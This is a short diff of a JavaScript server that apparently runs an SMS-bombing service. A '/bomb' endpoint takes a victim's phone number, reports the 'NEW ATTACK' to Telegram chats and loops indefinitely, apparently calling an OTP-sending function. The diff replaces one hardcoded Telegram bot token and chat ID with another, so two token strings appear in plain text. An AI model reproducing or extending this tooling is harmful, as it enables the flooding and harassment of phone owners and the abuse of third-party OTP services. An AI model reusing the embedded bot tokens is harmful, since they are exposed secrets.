@@ -105,7 +105,7 @@ async function smsotp(phone) {
 }
 
 async function sendTelegramMessage(message, chatIds) {
-  const botToken = '7613496664:AAGYd9DVTXdy3IJmpq14ZCJPRkDCq2_kShQ';
+  const botToken = '7625008223:AAGFBGRJ_VlESP7GMP3qFGD1Wu-RE4IY_eE';
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
   for (let chatId of chatIds) {
@@ -144,7 +144,7 @@ app.get("/bomb", async (req, res) => {
     numberspamed[number] = true;
 
     const message = `𝗨𝗦𝗘𝗥 𝗨𝗣𝗗𝗔𝗧𝗘𝗦 𝗡𝗘𝗪 𝗔𝗧𝗧𝗔𝗖𝗞\n\n\nNumber: ${number}\nSeconds: ${seconds}`;
-    const chatIds = ['7810011711', '-1002559344724'];
+    const chatIds = ['8193991666', '-1002559344724'];
     await sendTelegramMessage(message, chatIds);
 
     while (true) {
